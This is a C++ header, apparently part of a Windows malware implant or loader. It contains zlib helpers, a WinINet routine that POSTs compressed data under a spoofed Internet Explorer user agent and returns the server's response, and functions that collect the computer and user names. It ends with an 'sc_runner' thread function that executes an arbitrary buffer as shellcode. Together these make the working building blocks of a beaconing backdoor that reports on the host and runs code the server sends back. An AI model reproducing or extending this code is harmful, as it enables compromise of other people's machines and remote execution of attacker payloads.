#pragma once
#include "stdafx.h"
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <iomanip>
#include <sstream>
#include <string>
#include <utility>
#include <memory>
#include <vector>
#include <zlib.h>
auto get_path() -> std::wstring { //Return value optimization handled by CLANG.
	auto path_buf = std::make_unique<wchar_t[]>(MAX_PATH);
	::GetModuleFileNameW(nullptr, path_buf.get(), MAX_PATH);
	std::wstring exe(path_buf.get());
	return exe.substr(0, exe.find_last_of('\\'));
	/*
	namespace fs = std::experimental::filesystem;
	fs::path cwd(std::string(path_buf.get()));
	auto i = 0;
	auto sentinel = 5;
	for (fs::path::iterator iter = cwd.end(); iter != cwd.begin(); --iter) {
	i++;
	if (i == sentinel) {
	return (*iter).generic_string();
	}
	}
	return cwd.parent_path().generic_string();
	*/
	/*
	using namespace ranges;
	const auto rng = path | view::reverse | view::split('\\');
	return std::vector< unsigned char>(*next(begin(rng), 3));
	*/
}
bool compress(const std::string& src, std::string& dst) {
	z_stream stream;
	stream.zalloc = Z_NULL;
	stream.zfree = Z_NULL;
	stream.opaque = Z_NULL;
	stream.next_in = reinterpret_cast<unsigned char*>(const_cast<char*>(src.c_str()));
	stream.avail_in = src.length();

	deflateInit(&stream, Z_DEFAULT_COMPRESSION);
	uint32_t bound = deflateBound(&stream, src.length());
	std::vector<unsigned char> buffer(bound);
	stream.next_out = buffer.data();
	stream.avail_out = bound;

	int status = deflate(&stream, Z_FINISH);

	// zlib is unexpected wrong.
	if (Z_STREAM_END != status) {
		deflateEnd(&stream);
		return false;
	}

	dst.reserve(stream.total_out);
	std::copy(buffer.data(), buffer.data() + stream.total_out, std::back_inserter(dst));
	deflateEnd(&stream);
	return true;
}
bool un_compress(const uint8_t* src, unsigned long buf_length, std::string& dst) {
	int status;
	const uint32_t buffer_length = 4096;
	std::vector<unsigned char> buffer(buffer_length);
	z_stream stream;

	// Allocate with nullptr handlers
	stream.zalloc = Z_NULL;
	stream.zfree = Z_NULL;
	stream.opaque = Z_NULL;

	// Set input data
	stream.next_in = const_cast<uint8_t*>(src);
	stream.avail_in = buf_length;

	// Initialize the inflate process
	if (inflateInit(&stream) != Z_OK) {
		return false;
	}

	try {
		do {
			// Set output buffer
			stream.next_out = buffer.data();
			stream.avail_out = buffer_length;

			status = inflate(&stream, Z_SYNC_FLUSH);

			if (status != Z_OK && status != Z_STREAM_END) {
				inflateEnd(&stream);
				return false;
			}

			// Copy inflated data to the destination string
			dst.append(reinterpret_cast<char*>(buffer.data()), buffer_length - stream.avail_out);
		} while (status != Z_STREAM_END);

		inflateEnd(&stream);
	}
	catch (...) {
		inflateEnd(&stream);
		return false;
	}

	return true;
}


template <typename TF>
auto http_dl(const std::string& host, const std::string& url, const std::string& data, TF&& cb) -> bool {
	struct inet_deleter {
		void operator() (HINTERNET handle) {
			if (handle) {
				::InternetCloseHandle(handle);
			}
		}
	};
	using inet_session_ptr = std::unique_ptr<void, inet_deleter>;
	std::string agent{ "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)" };
	unsigned long  content_length_to_read = 0;
	unsigned long  size_of_content_length = sizeof(content_length_to_read);
	unsigned long  content_length_left = 0;
	unsigned long  timeout = 60 * 1000;
	inet_session_ptr handle_session{ ::InternetOpenA(agent.data(),INTERNET_OPEN_TYPE_PRECONFIG,0,0,0) };
	if (handle_session == nullptr) {
		return false;
	}
	::InternetSetOptionA(handle_session.get(), INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
	::InternetSetOptionA(handle_session.get(), INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
	::InternetSetOptionA(handle_session.get(), INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
	inet_session_ptr handle_connection{ ::InternetConnectA(handle_session.get(),host.c_str(),80,0,0,INTERNET_SERVICE_HTTP,0,0) };
	if (handle_connection == nullptr) {
		return false;
	}
	inet_session_ptr handle_request{ ::HttpOpenRequestA(handle_connection.get(),"POST",url.c_str(),"HTTP/1.1",0,0,INTERNET_FLAG_NO_UI | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD,0) };
	if (handle_request == nullptr) {
		return false;
	}
	std::string headers{ "Content-Type: application/octet-stream" };
	std::string compressed_data{};
	int ok = compress(data, compressed_data);
	if (!ok)return false;
	bool success = ::HttpSendRequestA(handle_request.get(), headers.c_str(), headers.size(), (LPVOID)compressed_data.c_str(), compressed_data.size());
	if (!success) {
		return false;
	}

	success = ::HttpQueryInfoA(handle_request.get(), HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &content_length_to_read, &size_of_content_length, 0);
	if (!success) {
		return false;
	}
	if (content_length_to_read > 0) {
		auto content = std::make_unique<uint8_t[]>(content_length_to_read);
		do {
			::InternetReadFile(handle_request.get(), content.get(), content_length_to_read, &content_length_left);
		} while (content_length_left);
		cb(std::move(content), content_length_to_read);
		return true;
	}
	else {
		return false;
	}
};
std::wstring get_computer_name() {
	wchar_t buffer[1024] = { 0 };
	unsigned long buffer_size = sizeof(buffer) / sizeof(buffer[0]);
	if (!GetComputerName(buffer, &buffer_size))return std::wstring{ L"unknown" };
	return std::wstring(&buffer[0]);
}
std::wstring get_user_name() {
	wchar_t buffer[1024] = { 0 };
	unsigned long buffer_size = sizeof(buffer) / sizeof(buffer[0]);
	if (!GetUserName(buffer, &buffer_size))return std::wstring{ L"unknown" };
	return std::wstring(&buffer[0]);
}
std::vector<std::wstring> splitString(const std::wstring& str, wchar_t delimiter) {
	std::vector<std::wstring> tokens;
	std::wstring token;
	std::wstringstream ss(str);

	while (std::getline(ss, token, delimiter)) {
		tokens.push_back(token);
	}
	return tokens;
}
DWORD WINAPI sc_runner(LPVOID shellcode)
{

	if (shellcode == NULL)
	{
		return -1;
	}
	try
	{
		(*(void(*)())shellcode)();
	}
	catch (...)
	{
	}



	return 0;
}